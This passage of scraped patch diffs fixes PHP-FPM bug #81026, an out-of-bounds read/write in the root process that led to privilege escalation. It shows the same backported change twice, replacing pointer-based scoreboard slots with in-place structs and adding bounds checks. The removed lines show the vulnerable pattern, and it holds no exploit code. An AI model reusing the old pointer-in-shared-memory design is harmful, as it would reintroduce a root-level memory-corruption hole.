+ struct fpm\_scoreboard\_s \*scoreboard, int child\_index) /\* {{{\*/
+{
+ if (!scoreboard) {
+ scoreboard = fpm\_scoreboard;
+ }
+
if (child\_index < 0) {
child\_index = fpm\_scoreboard\_i;
}
- if (child\_index < 0 || (unsigned int)child\_index >= scoreboard->nprocs) {
- return NULL;
- }
+ return fpm\_scoreboard\_proc\_get\_ex(scoreboard, child\_index, scoreboard->nprocs);
+}
+/\* }}} \*/
- return scoreboard->procs[child\_index];
+struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get\_from\_child(struct fpm\_child\_s \*child) /\* {{{\*/
+{
+ struct fpm\_worker\_pool\_s \*wp = child->wp;
+ unsigned int nprocs = wp->config->pm\_max\_children;
+ struct fpm\_scoreboard\_s \*scoreboard = wp->scoreboard;
+ int child\_index = child->scoreboard\_i;
+
+ return fpm\_scoreboard\_proc\_get\_ex(scoreboard, child\_index, nprocs);
}
/\* }}} \*/
+
struct fpm\_scoreboard\_s \*fpm\_scoreboard\_acquire(struct fpm\_scoreboard\_s \*scoreboard, int nohang) /\* {{{ \*/
{
struct fpm\_scoreboard\_s \*s;
@@ -234,28 +247,28 @@ void fpm\_scoreboard\_proc\_release(struct fpm\_scoreboard\_proc\_s \*proc) /\* {{{ \*/
proc->lock = 0;
}
-void fpm\_scoreboard\_free(struct fpm\_scoreboard\_s \*scoreboard) /\* {{{ \*/
+void fpm\_scoreboard\_free(struct fpm\_worker\_pool\_s \*wp) /\* {{{ \*/
{
- size\_t scoreboard\_size, scoreboard\_nprocs\_size;
+ size\_t scoreboard\_procs\_size;
+ struct fpm\_scoreboard\_s \*scoreboard = wp->scoreboard;
if (!scoreboard) {
zlog(ZLOG\_ERROR, "\*\*scoreboard is NULL");
return;
}
- scoreboard\_size = sizeof(struct fpm\_scoreboard\_s) + (scoreboard->nprocs) \* sizeof(struct fpm\_scoreboard\_proc\_s \*);
- scoreboard\_nprocs\_size = sizeof(struct fpm\_scoreboard\_proc\_s) \* scoreboard->nprocs;
+ scoreboard\_procs\_size = sizeof(struct fpm\_scoreboard\_proc\_s) \* wp->config->pm\_max\_children;
- fpm\_shm\_free(scoreboard, scoreboard\_size + scoreboard\_nprocs\_size);
+ fpm\_shm\_free(scoreboard, sizeof(struct fpm\_scoreboard\_s) + scoreboard\_procs\_size);
}
/\* }}} \*/
-void fpm\_scoreboard\_child\_use(struct fpm\_scoreboard\_s \*scoreboard, int child\_index, pid\_t pid) /\* {{{ \*/
+void fpm\_scoreboard\_child\_use(struct fpm\_child\_s \*child, pid\_t pid) /\* {{{ \*/
{
struct fpm\_scoreboard\_proc\_s \*proc;
- fpm\_scoreboard = scoreboard;
- fpm\_scoreboard\_i = child\_index;
- proc = fpm\_scoreboard\_proc\_get(scoreboard, child\_index);
+ fpm\_scoreboard = child->wp->scoreboard;
+ fpm\_scoreboard\_i = child->scoreboard\_i;
+ proc = fpm\_scoreboard\_proc\_get\_from\_child(child);
if (!proc) {
return;
}
@@ -264,18 +277,22 @@ void fpm\_scoreboard\_child\_use(struct fpm\_scoreboard\_s \*scoreboard, int child\_ind
}
/\* }}} \*/
-void fpm\_scoreboard\_proc\_free(struct fpm\_scoreboard\_s \*scoreboard, int child\_index) /\* {{{ \*/
+void fpm\_scoreboard\_proc\_free(struct fpm\_child\_s \*child) /\* {{{ \*/
{
+ struct fpm\_worker\_pool\_s \*wp = child->wp;
+ struct fpm\_scoreboard\_s \*scoreboard = wp->scoreboard;
+ int child\_index = child->scoreboard\_i;
+
if (!scoreboard) {
return;
}
- if (child\_index < 0 || (unsigned int)child\_index >= scoreboard->nprocs) {
+ if (child\_index < 0 || child\_index >= wp->config->pm\_max\_children) {
return;
}
- if (scoreboard->procs[child\_index] && scoreboard->procs[child\_index]->used > 0) {
- memset(scoreboard->procs[child\_index], 0, sizeof(struct fpm\_scoreboard\_proc\_s));
+ if (scoreboard->procs[child\_index].used > 0) {
+ memset(&scoreboard->procs[child\_index], 0, sizeof(struct fpm\_scoreboard\_proc\_s));
}
/\* set this slot as free to avoid search on next alloc \*/
@@ -283,41 +300,44 @@ void fpm\_scoreboard\_proc\_free(struct fpm\_scoreboard\_s \*scoreboard, int child\_ind
}
/\* }}} \*/
-int fpm\_scoreboard\_proc\_alloc(struct fpm\_scoreboard\_s \*scoreboard, int \*child\_index) /\* {{{ \*/
+int fpm\_scoreboard\_proc\_alloc(struct fpm\_child\_s \*child) /\* {{{ \*/
{
int i = -1;
+ struct fpm\_worker\_pool\_s \*wp = child->wp;
+ struct fpm\_scoreboard\_s \*scoreboard = wp->scoreboard;
+ int nprocs = wp->config->pm\_max\_children;
- if (!scoreboard || !child\_index) {
+ if (!scoreboard) {
return -1;
}
/\* first try the slot which is supposed to be free \*/
- if (scoreboard->free\_proc >= 0 && (unsigned int)scoreboard->free\_proc < scoreboard->nprocs) {
- if (scoreboard->procs[scoreboard->free\_proc] && !scoreboard->procs[scoreboard->free\_proc]->used) {
+ if (scoreboard->free\_proc >= 0 && scoreboard->free\_proc < nprocs) {
+ if (!scoreboard->procs[scoreboard->free\_proc].used) {
i = scoreboard->free\_proc;
}
}
if (i < 0) { /\* the supposed free slot is not, let's search for a free slot \*/
zlog(ZLOG\_DEBUG, "[pool %s] the proc->free\_slot was not free. Let's search", scoreboard->pool);
- for (i = 0; i < (int)scoreboard->nprocs; i++) {
- if (scoreboard->procs[i] && !scoreboard->procs[i]->used) { /\* found \*/
+ for (i = 0; i < nprocs; i++) {
+ if (!scoreboard->procs[i].used) { /\* found \*/
break;
}
}
}
/\* no free slot \*/
- if (i < 0 || i >= (int)scoreboard->nprocs) {
+ if (i < 0 || i >= nprocs) {
zlog(ZLOG\_ERROR, "[pool %s] no free scoreboard slot", scoreboard->pool);
return -1;
}
- scoreboard->procs[i]->used = 1;
- \*child\_index = i;
+ scoreboard->procs[i].used = 1;
+ child->scoreboard\_i = i;
/\* supposed next slot is free \*/
- if (i + 1 >= (int)scoreboard->nprocs) {
+ if (i + 1 >= nprocs) {
scoreboard->free\_proc = 0;
} else {
scoreboard->free\_proc = i + 1;
diff --git a/sapi/fpm/fpm/fpm\_scoreboard.h b/sapi/fpm/fpm/fpm\_scoreboard.h
index 1fecde1d0feb1..9d5981e1c739f 100644
--- a/sapi/fpm/fpm/fpm\_scoreboard.h
+++ b/sapi/fpm/fpm/fpm\_scoreboard.h
@@ -63,7 +63,7 @@ struct fpm\_scoreboard\_s {
unsigned int nprocs;
int free\_proc;
unsigned long int slow\_rq;
- struct fpm\_scoreboard\_proc\_s \*procs[];
+ struct fpm\_scoreboard\_proc\_s procs[];
};
int fpm\_scoreboard\_init\_main();
@@ -72,18 +72,19 @@ int fpm\_scoreboard\_init\_child(struct fpm\_worker\_pool\_s \*wp);
void fpm\_scoreboard\_update(int idle, int active, int lq, int lq\_len, int requests, int max\_children\_reached, int slow\_rq, int action, struct fpm\_scoreboard\_s \*scoreboard);
struct fpm\_scoreboard\_s \*fpm\_scoreboard\_get();
struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get(struct fpm\_scoreboard\_s \*scoreboard, int child\_index);
+struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get\_from\_child(struct fpm\_child\_s \*child);
struct fpm\_scoreboard\_s \*fpm\_scoreboard\_acquire(struct fpm\_scoreboard\_s \*scoreboard, int nohang);
void fpm\_scoreboard\_release(struct fpm\_scoreboard\_s \*scoreboard);
struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_acquire(struct fpm\_scoreboard\_s \*scoreboard, int child\_index, int nohang);
void fpm\_scoreboard\_proc\_release(struct fpm\_scoreboard\_proc\_s \*proc);
-void fpm\_scoreboard\_free(struct fpm\_scoreboard\_s \*scoreboard);
+void fpm\_scoreboard\_free(struct fpm\_worker\_pool\_s \*wp);
-void fpm\_scoreboard\_child\_use(struct fpm\_scoreboard\_s \*scoreboard, int child\_index, pid\_t pid);
+void fpm\_scoreboard\_child\_use(struct fpm\_child\_s \*child, pid\_t pid);
-void fpm\_scoreboard\_proc\_free(struct fpm\_scoreboard\_s \*scoreboard, int child\_index);
-int fpm\_scoreboard\_proc\_alloc(struct fpm\_scoreboard\_s \*scoreboard, int \*child\_index);
+void fpm\_scoreboard\_proc\_free(struct fpm\_child\_s \*child);
+int fpm\_scoreboard\_proc\_alloc(struct fpm\_child\_s \*child);
#ifdef HAVE\_TIMES
float fpm\_scoreboard\_get\_tick();
diff --git a/sapi/fpm/fpm/fpm\_status.c b/sapi/fpm/fpm/fpm\_status.c
index 36d2240635830..de8db9d61a252 100644
--- a/sapi/fpm/fpm/fpm\_status.c
+++ b/sapi/fpm/fpm/fpm\_status.c
@@ -498,10 +498,10 @@ int fpm\_status\_handle\_request(void) /\* {{{ \*/
first = 1;
for (i=0; inprocs; i++) {
- if (!scoreboard\_p->procs[i] || !scoreboard\_p->procs[i]->used) {
+ if (!scoreboard\_p->procs[i].used) {
continue;
}
- proc = \*scoreboard\_p->procs[i];
+ proc = scoreboard\_p->procs[i];
if (first) {
first = 0;
diff --git a/sapi/fpm/fpm/fpm\_worker\_pool.c b/sapi/fpm/fpm/fpm\_worker\_pool.c
index e4ad73169d491..689b06155777c 100644
--- a/sapi/fpm/fpm/fpm\_worker\_pool.c
+++ b/sapi/fpm/fpm/fpm\_worker\_pool.c
@@ -42,7 +42,7 @@ static void fpm\_worker\_pool\_cleanup(int which, void \*arg) /\* {{{ \*/
fpm\_worker\_pool\_config\_free(wp->config);
fpm\_children\_free(wp->children);
if ((which & FPM\_CLEANUP\_CHILD) == 0 && fpm\_globals.parent\_pid == getpid()) {
- fpm\_scoreboard\_free(wp->scoreboard);
+ fpm\_scoreboard\_free(wp);
}
fpm\_worker\_pool\_free(wp);
}


=== Content from github.com_71ce1925_20250115_115347.html ===
From 0f2a7ebf53b3787651157f1509c0cd6fc1292a1a Mon Sep 17 00:00:00 2001
From: Jakub Zelenka
Date: Sat, 2 Oct 2021 22:53:41 +0100
Subject: [PATCH] Fix bug #81026 (PHP-FPM oob R/W in root process leading to
priv escalation)
The main change is to store scoreboard procs directly to the variable sized
array rather than indirectly through the pointer.
Signed-off-by: Stanislav Malyshev
(cherry picked from commit cb2021e5f69da5e2868130a05bb53db0f9f89e4b)
(cherry picked from commit 4699cc1b1b957c843c71a79fa816446b622d4278)
---
sapi/fpm/fpm/fpm\_children.c | 14 ++---
sapi/fpm/fpm/fpm\_request.c | 4 +-
sapi/fpm/fpm/fpm\_scoreboard.c | 107 +++++++++++++++++++--------------
sapi/fpm/fpm/fpm\_scoreboard.h | 11 ++--
sapi/fpm/fpm/fpm\_status.c | 4 +-
sapi/fpm/fpm/fpm\_worker\_pool.c | 2 +-
6 files changed, 81 insertions(+), 61 deletions(-)
diff --git a/sapi/fpm/fpm/fpm\_children.c b/sapi/fpm/fpm/fpm\_children.c
index 45cc075b42a..74c2f382366 100644
--- a/sapi/fpm/fpm/fpm\_children.c
+++ b/sapi/fpm/fpm/fpm\_children.c
@@ -239,7 +239,7 @@ void fpm\_children\_bury() /\* {{{ \*/
fpm\_child\_unlink(child);
- fpm\_scoreboard\_proc\_free(wp->scoreboard, child->scoreboard\_i);
+ fpm\_scoreboard\_proc\_free(child);
fpm\_clock\_get(&tv1);
@@ -249,9 +249,9 @@ void fpm\_children\_bury() /\* {{{ \*/
if (!fpm\_pctl\_can\_spawn\_children()) {
severity = ZLOG\_DEBUG;
}
- zlog(severity, "[pool %s] child %d exited %s after %ld.%06d seconds from start", child->wp->config->name, (int) pid, buf, tv2.tv\_sec, (int) tv2.tv\_usec);
+ zlog(severity, "[pool %s] child %d exited %s after %ld.%06d seconds from start", wp->config->name, (int) pid, buf, tv2.tv\_sec, (int) tv2.tv\_usec);
} else {
- zlog(ZLOG\_DEBUG, "[pool %s] child %d has been killed by the process management after %ld.%06d seconds from start", child->wp->config->name, (int) pid, tv2.tv\_sec, (int) tv2.tv\_usec);
+ zlog(ZLOG\_DEBUG, "[pool %s] child %d has been killed by the process management after %ld.%06d seconds from start", wp->config->name, (int) pid, tv2.tv\_sec, (int) tv2.tv\_usec);
}
fpm\_child\_close(child, 1 /\* in event\_loop \*/);
@@ -317,7 +317,7 @@ static struct fpm\_child\_s \*fpm\_resources\_prepare(struct fpm\_worker\_pool\_s \*wp) /
return 0;
}
- if (0 > fpm\_scoreboard\_proc\_alloc(wp->scoreboard, &c->scoreboard\_i)) {
+ if (0 > fpm\_scoreboard\_proc\_alloc(c)) {
fpm\_stdio\_discard\_pipes(c);
fpm\_child\_free(c);
return 0;
@@ -329,7 +329,7 @@ static struct fpm\_child\_s \*fpm\_resources\_prepare(struct fpm\_worker\_pool\_s \*wp) /
static void fpm\_resources\_discard(struct fpm\_child\_s \*child) /\* {{{ \*/
{
- fpm\_scoreboard\_proc\_free(child->wp->scoreboard, child->scoreboard\_i);
+ fpm\_scoreboard\_proc\_free(child);
fpm\_stdio\_discard\_pipes(child);
fpm\_child\_free(child);
}
@@ -342,10 +342,10 @@ static void fpm\_child\_resources\_use(struct fpm\_child\_s \*child) /\* {{{ \*/
if (wp == child->wp) {
continue;
}
- fpm\_scoreboard\_free(wp->scoreboard);
+ fpm\_scoreboard\_free(wp);
}
- fpm\_scoreboard\_child\_use(child->wp->scoreboard, child->scoreboard\_i, getpid());
+ fpm\_scoreboard\_child\_use(child, getpid());
fpm\_stdio\_child\_use\_pipes(child);
fpm\_child\_free(child);
}
diff --git a/sapi/fpm/fpm/fpm\_request.c b/sapi/fpm/fpm/fpm\_request.c
index ed7e7a8890d..23782fbb050 100644
--- a/sapi/fpm/fpm/fpm\_request.c
+++ b/sapi/fpm/fpm/fpm\_request.c
@@ -287,7 +287,7 @@ int fpm\_request\_is\_idle(struct fpm\_child\_s \*child) /\* {{{ \*/
struct fpm\_scoreboard\_proc\_s \*proc;
/\* no need in atomicity here \*/
- proc = fpm\_scoreboard\_proc\_get(child->wp->scoreboard, child->scoreboard\_i);
+ proc = fpm\_scoreboard\_proc\_get\_from\_child(child);
if (!proc) {
return 0;
}
@@ -302,7 +302,7 @@ int fpm\_request\_last\_activity(struct fpm\_child\_s \*child, struct timeval \*tv) /\*
if (!tv) return -1;
- proc = fpm\_scoreboard\_proc\_get(child->wp->scoreboard, child->scoreboard\_i);
+ proc = fpm\_scoreboard\_proc\_get\_from\_child(child);
if (!proc) {
return -1;
}
diff --git a/sapi/fpm/fpm/fpm\_scoreboard.c b/sapi/fpm/fpm/fpm\_scoreboard.c
index e1e69c9780c..fcf9f169705 100644
--- a/sapi/fpm/fpm/fpm\_scoreboard.c
+++ b/sapi/fpm/fpm/fpm\_scoreboard.c
@@ -8,6 +8,7 @@
#include
#include "fpm\_config.h"
+#include "fpm\_children.h"
#include "fpm\_scoreboard.h"
#include "fpm\_shm.h"
#include "fpm\_sockets.h"
@@ -25,7 +26,6 @@ static float fpm\_scoreboard\_tick;
int fpm\_scoreboard\_init\_main() /\* {{{ \*/
{
struct fpm\_worker\_pool\_s \*wp;
- unsigned int i;
#ifdef HAVE\_TIMES
#if (defined(HAVE\_SYSCONF) && defined(\_SC\_CLK\_TCK))
@@ -42,7 +42,7 @@ int fpm\_scoreboard\_init\_main() /\* {{{ \*/
for (wp = fpm\_worker\_all\_pools; wp; wp = wp->next) {
- size\_t scoreboard\_size, scoreboard\_nprocs\_size;
+ size\_t scoreboard\_procs\_size;
void \*shm\_mem;
if (wp->config->pm\_max\_children < 1) {
@@ -55,22 +55,15 @@ int fpm\_scoreboard\_init\_main() /\* {{{ \*/
return -1;
}
- scoreboard\_size = sizeof(struct fpm\_scoreboard\_s) + (wp->config->pm\_max\_children) \* sizeof(struct fpm\_scoreboard\_proc\_s \*);
- scoreboard\_nprocs\_size = sizeof(struct fpm\_scoreboard\_proc\_s) \* wp->config->pm\_max\_children;
- shm\_mem = fpm\_shm\_alloc(scoreboard\_size + scoreboard\_nprocs\_size);
+ scoreboard\_procs\_size = sizeof(struct fpm\_scoreboard\_proc\_s) \* wp->config->pm\_max\_children;
+ shm\_mem = fpm\_shm\_alloc(sizeof(struct fpm\_scoreboard\_s) + scoreboard\_procs\_size);
if (!shm\_mem) {
return -1;
}
- wp->scoreboard = shm\_mem;
+ wp->scoreboard = shm\_mem;
+ wp->scoreboard->pm = wp->config->pm;
wp->scoreboard->nprocs = wp->config->pm\_max\_children;
- shm\_mem += scoreboard\_size;
-
- for (i = 0; i < wp->scoreboard->nprocs; i++, shm\_mem += sizeof(struct fpm\_scoreboard\_proc\_s)) {
- wp->scoreboard->procs[i] = shm\_mem;
- }
-
- wp->scoreboard->pm = wp->config->pm;
wp->scoreboard->start\_epoch = time(NULL);
strlcpy(wp->scoreboard->pool, wp->config->name, sizeof(wp->scoreboard->pool));
}
@@ -164,28 +157,47 @@ struct fpm\_scoreboard\_s \*fpm\_scoreboard\_get() /\* {{{\*/
}
/\* }}} \*/
-struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get(struct fpm\_scoreboard\_s \*scoreboard, int child\_index) /\* {{{\*/
+static inline struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get\_ex(
+ struct fpm\_scoreboard\_s \*scoreboard, int child\_index, unsigned int nprocs) /\* {{{\*/
{
if (!scoreboard) {
- scoreboard = fpm\_scoreboard;
+ return NULL;
}
- if (!scoreboard) {
+ if (child\_index < 0 || (unsigned int)child\_index >= nprocs) {
return NULL;
}
+ return &scoreboard->procs[child\_index];
+}
+/\* }}} \*/
+
+struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get(
+ struct fpm\_scoreboard\_s \*scoreboard, int child\_index) /\* {{{\*/
+{
+ if (!scoreboard) {
+ scoreboard = fpm\_scoreboard;
+ }
+
if (child\_index < 0) {
child\_index = fpm\_scoreboard\_i;
}
- if (child\_index < 0 || child\_index >= scoreboard->nprocs) {
- return NULL;
- }
+ return fpm\_scoreboard\_proc\_get\_ex(scoreboard, child\_index, scoreboard->nprocs);
+}
+
+struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get\_from\_child(struct fpm\_child\_s \*child) /\* {{{\*/
+{
+ struct fpm\_worker\_pool\_s \*wp = child->wp;
+ unsigned int nprocs = wp->config->pm\_max\_children;
+ struct fpm\_scoreboard\_s \*scoreboard = wp->scoreboard;
+ int child\_index = child->scoreboard\_i;
- return scoreboard->procs[child\_index];
+ return fpm\_scoreboard\_proc\_get\_ex(scoreboard, child\_index, nprocs);
}
/\* }}} \*/
+
struct fpm\_scoreboard\_s \*fpm\_scoreboard\_acquire(struct fpm\_scoreboard\_s \*scoreboard, int nohang) /\* {{{ \*/
{
struct fpm\_scoreboard\_s \*s;
@@ -236,28 +248,28 @@ void fpm\_scoreboard\_proc\_release(struct fpm\_scoreboard\_proc\_s \*proc) /\* {{{ \*/
proc->lock = 0;
}
-void fpm\_scoreboard\_free(struct fpm\_scoreboard\_s \*scoreboard) /\* {{{ \*/
+void fpm\_scoreboard\_free(struct fpm\_worker\_pool\_s \*wp) /\* {{{ \*/
{
- size\_t scoreboard\_size, scoreboard\_nprocs\_size;
+ size\_t scoreboard\_procs\_size;
+ struct fpm\_scoreboard\_s \*scoreboard = wp->scoreboard;
if (!scoreboard) {
zlog(ZLOG\_ERROR, "\*\*scoreboard is NULL");
return;
}
- scoreboard\_size = sizeof(struct fpm\_scoreboard\_s) + (scoreboard->nprocs) \* sizeof(struct fpm\_scoreboard\_proc\_s \*);
- scoreboard\_nprocs\_size = sizeof(struct fpm\_scoreboard\_proc\_s) \* scoreboard->nprocs;
-
- fpm\_shm\_free(scoreboard, scoreboard\_size + scoreboard\_nprocs\_size);
+ scoreboard\_procs\_size = sizeof(struct fpm\_scoreboard\_proc\_s) \* wp->config->pm\_max\_children;
+
+ fpm\_shm\_free(scoreboard, sizeof(struct fpm\_scoreboard\_s) + scoreboard\_procs\_size);
}
/\* }}} \*/
-void fpm\_scoreboard\_child\_use(struct fpm\_scoreboard\_s \*scoreboard, int child\_index, pid\_t pid) /\* {{{ \*/
+void fpm\_scoreboard\_child\_use(struct fpm\_child\_s \*child, pid\_t pid) /\* {{{ \*/
{
struct fpm\_scoreboard\_proc\_s \*proc;
- fpm\_scoreboard = scoreboard;
- fpm\_scoreboard\_i = child\_index;
- proc = fpm\_scoreboard\_proc\_get(scoreboard, child\_index);
+ fpm\_scoreboard = child->wp->scoreboard;
+ fpm\_scoreboard\_i = child->scoreboard\_i;
+ proc = fpm\_scoreboard\_proc\_get\_from\_child(child);
if (!proc) {
return;
}
@@ -266,18 +278,22 @@ void fpm\_scoreboard\_child\_use(struct fpm\_scoreboard\_s \*scoreboard, int child\_ind
}
/\* }}} \*/
-void fpm\_scoreboard\_proc\_free(struct fpm\_scoreboard\_s \*scoreboard, int child\_index) /\* {{{ \*/
+void fpm\_scoreboard\_proc\_free(struct fpm\_child\_s \*child) /\* {{{ \*/
{
+ struct fpm\_worker\_pool\_s \*wp = child->wp;
+ struct fpm\_scoreboard\_s \*scoreboard = wp->scoreboard;
+ int child\_index = child->scoreboard\_i;
+
if (!scoreboard) {
return;
}
- if (child\_index < 0 || child\_index >= scoreboard->nprocs) {
+ if (child\_index < 0 || child\_index >= wp->config->pm\_max\_children) {
return;
}
- if (scoreboard->procs[child\_index] && scoreboard->procs[child\_index]->used > 0) {
- memset(scoreboard->procs[child\_index], 0, sizeof(struct fpm\_scoreboard\_proc\_s));
+ if (scoreboard->procs[child\_index].used > 0) {
+ memset(&scoreboard->procs[child\_index], 0, sizeof(struct fpm\_scoreboard\_proc\_s));
}
/\* set this slot as free to avoid search on next alloc \*/
@@ -285,41 +301,44 @@ void fpm\_scoreboard\_proc\_free(struct fpm\_scoreboard\_s \*scoreboard, int child\_ind
}
/\* }}} \*/
-int fpm\_scoreboard\_proc\_alloc(struct fpm\_scoreboard\_s \*scoreboard, int \*child\_index) /\* {{{ \*/
+int fpm\_scoreboard\_proc\_alloc(struct fpm\_child\_s \*child) /\* {{{ \*/
{
int i = -1;
+ struct fpm\_worker\_pool\_s \*wp = child->wp;
+ struct fpm\_scoreboard\_s \*scoreboard = wp->scoreboard;
+ int nprocs = wp->config->pm\_max\_children;
- if (!scoreboard || !child\_index) {
+ if (!scoreboard) {
return -1;
}
/\* first try the slot which is supposed to be free \*/
- if (scoreboard->free\_proc >= 0 && scoreboard->free\_proc < scoreboard->nprocs) {
- if (scoreboard->procs[scoreboard->free\_proc] && !scoreboard->procs[scoreboard->free\_proc]->used) {
+ if (scoreboard->free\_proc >= 0 && scoreboard->free\_proc < nprocs) {
+ if (!scoreboard->procs[scoreboard->free\_proc].used) {
i = scoreboard->free\_proc;
}
}
if (i < 0) { /\* the supposed free slot is not, let's search for a free slot \*/
zlog(ZLOG\_DEBUG, "[pool %s] the proc->free\_slot was not free. Let's search", scoreboard->pool);
- for (i = 0; i < scoreboard->nprocs; i++) {
- if (scoreboard->procs[i] && !scoreboard->procs[i]->used) { /\* found \*/
+ for (i = 0; i < nprocs; i++) {
+ if (!scoreboard->procs[i].used) { /\* found \*/
break;
}
}
}
/\* no free slot \*/
- if (i < 0 || i >= scoreboard->nprocs) {
+ if (i < 0 || i >= nprocs) {
zlog(ZLOG\_ERROR, "[pool %s] no free scoreboard slot", scoreboard->pool);
return -1;
}
- scoreboard->procs[i]->used = 1;
- \*child\_index = i;
+ scoreboard->procs[i].used = 1;
+ child->scoreboard\_i = i;
/\* supposed next slot is free \*/
- if (i + 1 >= scoreboard->nprocs) {
+ if (i + 1 >= nprocs) {
scoreboard->free\_proc = 0;
} else {
scoreboard->free\_proc = i + 1;
diff --git a/sapi/fpm/fpm/fpm\_scoreboard.h b/sapi/fpm/fpm/fpm\_scoreboard.h
index f58a28737df..a0cc093b8c4 100644
--- a/sapi/fpm/fpm/fpm\_scoreboard.h
+++ b/sapi/fpm/fpm/fpm\_scoreboard.h
@@ -65,7 +65,7 @@ struct fpm\_scoreboard\_s {
unsigned int nprocs;
int free\_proc;
unsigned long int slow\_rq;
- struct fpm\_scoreboard\_proc\_s \*procs[];
+ struct fpm\_scoreboard\_proc\_s procs[];
};
int fpm\_scoreboard\_init\_main();
@@ -74,18 +74,19 @@ int fpm\_scoreboard\_init\_child(struct fpm\_worker\_pool\_s \*wp);
void fpm\_scoreboard\_update(int idle, int active, int lq, int lq\_len, int requests, int max\_children\_reached, int slow\_rq, int action, struct fpm\_scoreboard\_s \*scoreboard);
struct fpm\_scoreboard\_s \*fpm\_scoreboard\_get();
struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get(struct fpm\_scoreboard\_s \*scoreboard, int child\_index);
+struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get\_from\_child(struct fpm\_child\_s \*child);
struct fpm\_scoreboard\_s \*fpm\_scoreboard\_acquire(struct fpm\_scoreboard\_s \*scoreboard, int nohang);
void fpm\_scoreboard\_release(struct fpm\_scoreboard\_s \*scoreboard);
struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_acquire(struct fpm\_scoreboard\_s \*scoreboard, int child\_index, int nohang);
void fpm\_scoreboard\_proc\_release(struct fpm\_scoreboard\_proc\_s \*proc);
-void fpm\_scoreboard\_free(struct fpm\_scoreboard\_s \*scoreboard);
+void fpm\_scoreboard\_free(struct fpm\_worker\_pool\_s \*wp);
-void fpm\_scoreboard\_child\_use(struct fpm\_scoreboard\_s \*scoreboard, int child\_index, pid\_t pid);
+void fpm\_scoreboard\_child\_use(struct fpm\_child\_s \*child, pid\_t pid);
-void fpm\_scoreboard\_proc\_free(struct fpm\_scoreboard\_s \*scoreboard, int child\_index);
-int fpm\_scoreboard\_proc\_alloc(struct fpm\_scoreboard\_s \*scoreboard, int \*child\_index);
+void fpm\_scoreboard\_proc\_free(struct fpm\_child\_s \*child);
+int fpm\_scoreboard\_proc\_alloc(struct fpm\_child\_s \*child);
#ifdef HAVE\_TIMES
float fpm\_scoreboard\_get\_tick();
diff --git a/sapi/fpm/fpm/fpm\_status.c b/sapi/fpm/fpm/fpm\_status.c
index 2363b57f801..a2ee398d293 100644
--- a/sapi/fpm/fpm/fpm\_status.c
+++ b/sapi/fpm/fpm/fpm\_status.c
@@ -399,10 +399,10 @@ int fpm\_status\_handle\_request(TSRMLS\_D) /\* {{{ \*/
first = 1;
for (i=0; inprocs; i++) {
- if (!scoreboard\_p->procs[i] || !scoreboard\_p->procs[i]->used) {
+ if (!scoreboard\_p->procs[i].used) {
continue;
}
- proc = \*scoreboard\_p->procs[i];
+ proc = scoreboard\_p->procs[i];
if (first) {
first = 0;
diff --git a/sapi/fpm/fpm/fpm\_worker\_pool.c b/sapi/fpm/fpm/fpm\_worker\_pool.c
index a0022915cdc..c778b33c8c8 100644
--- a/sapi/fpm/fpm/fpm\_worker\_pool.c
+++ b/sapi/fpm/fpm/fpm\_worker\_pool.c
@@ -44,7 +44,7 @@ static void fpm\_worker\_pool\_cleanup(int which, void \*arg) /\* {{{ \*/
fpm\_worker\_pool\_config\_free(wp->config);
fpm\_children\_free(wp->children);
if ((which & FPM\_CLEANUP\_CHILD) == 0 && fpm\_globals.parent\_pid == getpid()) {
- fpm\_scoreboard\_free(wp->scoreboard);
+ fpm\_scoreboard\_free(wp);
}
fpm\_worker\_pool\_free(wp);
}

